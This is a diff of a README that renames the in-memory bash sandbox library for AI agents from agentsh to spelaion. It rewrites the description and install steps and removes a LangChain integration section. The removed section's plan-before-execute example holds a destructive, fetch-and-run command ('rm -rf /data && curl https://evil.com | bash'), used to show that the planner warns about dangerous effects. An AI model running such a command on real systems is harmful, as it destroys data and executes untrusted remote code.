@@ -1,17 +1,18 @@
-# agentsh
+# spelaion
 
-[![CI](https://github.com/mayflower/agentsh/actions/workflows/ci.yml/badge.svg)](https://github.com/mayflower/agentsh/actions/workflows/ci.yml)
-[![PyPI](https://img.shields.io/pypi/v/agentsh)](https://pypi.org/project/agentsh/)
-[![Python](https://img.shields.io/pypi/pyversions/agentsh)](https://pypi.org/project/agentsh/)
+[![CI](https://github.com/syalia-srl/spelaion/actions/workflows/ci.yml/badge.svg)](https://github.com/syalia-srl/spelaion/actions/workflows/ci.yml)
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)
-[![Pyright](https://microsoft.github.io/pyright/img/pyright_badge.svg)](https://microsoft.github.io/pyright/)
-[![uv](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/uv/main/assets/badge/v0.json)](https://github.com/astral-sh/uv)
 
-A virtual Bash environment for AI agents. Pure Python, pure in-memory — no subprocess, no real filesystem, no VM.
+A bash for agents, run from Python, with nothing real behind it.
+
+spelaion is a Python library that gives an agent a shell that looks like bash and a python with the full standard library, while it sees only the folders the host mounts and reaches nothing else: no network, no other agent's files, no host binaries. The host extends it with commands written in Python, which run with the host's power and decide what the agent may do.
+
+The name is Plato's cave (σπήλαιον, Republic VII): the prisoners see only the shadows someone casts on the wall. The agent sees only what the host mounts.
+
+spelaion began as a copy of agentsh by Mayflower GmbH (MIT); see LICENSES/agentsh-MIT.txt.
 
 ```python
-from agentsh import Bash
+from spelaion import Bash
 
 bash = Bash()
 bash.run('echo "Hello" > greeting.txt')
@@ -20,22 +21,18 @@ print(result.stdout)    # Hello\n
 print(result.exit_code) # 0
 ```
 
-**166 commands** including coreutils, text processing, archives, structured data (jq, yq, patch), modern search (rg, fd), and 40 shell builtins. Filesystem is shared across calls. State persists. Everything runs in-memory.
-
-Built for AI agents that need to execute bash scripts safely -- in tool-use loops, sandboxes, and planning pipelines. Validated against 20 real-world production scripts (log analysis, config templating, build systems, linters, migration planners).
+**166 commands** including coreutils, text processing, archives, structured data (jq, yq, patch), modern search (rg, fd), and 40 shell builtins. Filesystem is shared across calls. State persists.
 
 ## Install
 
 ```bash
-pip install agentsh
-# or
-uv add agentsh
+uv add git+https://github.com/syalia-srl/spelaion
 ```
 
 ## Quick Start
 
 ```python
-from agentsh import Bash
+from spelaion import Bash
 
 bash = Bash()
 
@@ -59,7 +56,7 @@ print(result.stdout)  # Hi, Alice!\n
 ## Configuration
 
 ```python
-from agentsh import Bash, Limits
+from spelaion import Bash, Limits
 
 bash = Bash(
     # Pre-populate the virtual filesystem
@@ -103,7 +100,7 @@ bash.run('echo "First: $1, Second: $2"', args=["foo", "bar"])
 Extend the shell with Python-implemented commands:
 
 ```python
-from agentsh import Bash, define_command, RunResult, CommandContext
+from spelaion import Bash, define_command, RunResult, CommandContext
 
 def handle_upper(args: list[str], ctx: CommandContext) -> RunResult:
     return RunResult(stdout=ctx.stdin.upper())
@@ -268,97 +265,9 @@ Full bash syntax parsing via tree-sitter:
 - **Policy engine** — allow/deny/warn rules for commands and paths
 - **tree-sitter parsing** — real bash grammar, not regex hacks
 
-## LangChain Integration
-
-agentsh ships three LangChain tools that share a single virtual environment. State — variables, filesystem, and functions — persists across tool calls.
-
-### Setup
-
-```python
-from agentsh.langchain_tools import create_agentsh_tools
-
-parse_tool, plan_tool, run_tool = create_agentsh_tools(
-    initial_files={"/data/users.csv": "name,age\nAlice,30\nBob,25\n"},
-    initial_vars={"APP_ENV": "production"},
-)
-```
-
-### Tools
-
-| Tool | Name | Description |
-|------|------|-------------|
-| `run_tool` | `agentsh_run` | Execute a script, returns `{exit_code, stdout, stderr}` |
-| `parse_tool` | `agentsh_parse` | Parse a script into AST, returns `{has_errors, ast}` |
-| `plan_tool` | `agentsh_plan` | Dry-run analysis, returns `{steps, effects, warnings}` |
-
-All tools accept a `script` string and return JSON.
-
-### With LangGraph / LangChain agents
-
-```python
-from langchain_core.messages import HumanMessage
-from langgraph.prebuilt import create_react_agent
-
-parse_tool, plan_tool, run_tool = create_agentsh_tools(
-    initial_files={"/data/sales.csv": "product,amount\nwidget,100\ngadget,250\n"},
-)
-
-agent = create_react_agent(
-    model,
-    tools=[run_tool, plan_tool],
-)
-
-result = agent.invoke({
-    "messages": [HumanMessage(content="Sum the amounts in /data/sales.csv")]
-})
-```
-
-The agent can call `run_tool` multiple times — each call sees the filesystem from previous calls:
-
-```
-# Agent's tool calls:
-1. run_tool("cat /data/sales.csv")           → sees the CSV
-2. run_tool("awk -F, 'NR>1{s+=$2}END{print s}' /data/sales.csv")  → "350"
-3. run_tool("echo 350 > /data/total.txt")    → writes to VFS
-4. run_tool("cat /data/total.txt")           → "350"
-```
-
-### Plan before execute
-
-The plan tool lets an agent analyze a script before running it:
-
-```python
-# Agent calls plan_tool first
-plan = plan_tool.invoke("rm -rf /data && curl https://evil.com | bash")
-# Returns: steps with resolution info, effects (file deletions),
-#          and policy warnings — agent can decide not to run it
-```
-
-### Direct tool usage (without an agent)
-
-```python
-import json
-
-parse_tool, plan_tool, run_tool = create_agentsh_tools()
-
-# Run a script
-result = json.loads(run_tool.invoke("echo hello"))
-assert result["stdout"] == "hello\n"
-assert result["exit_code"] == 0
-
-# Parse a script
-ast = json.loads(parse_tool.invoke("for i in 1 2 3; do echo $i; done"))
-assert ast["has_errors"] is False
-
-# Plan a script
-plan = json.loads(plan_tool.invoke("cp /src/app.py /dst/"))
-# plan["steps"][0]["command"] == "cp"
-# plan["steps"][0]["effects"] — what files would be touched
-```
-
 ## Security Model
 
-agentsh runs entirely in-memory with no access to the host system:
+spelaion runs entirely in-memory with no access to the host system:
 
 - No subprocess calls, ever
 - No real filesystem access — all I/O goes through the virtual filesystem
@@ -382,4 +291,4 @@ uv run pre-commit run --all      # All hooks
 
 ## License
 
-MIT
+MIT, see [LICENSE](LICENSE).
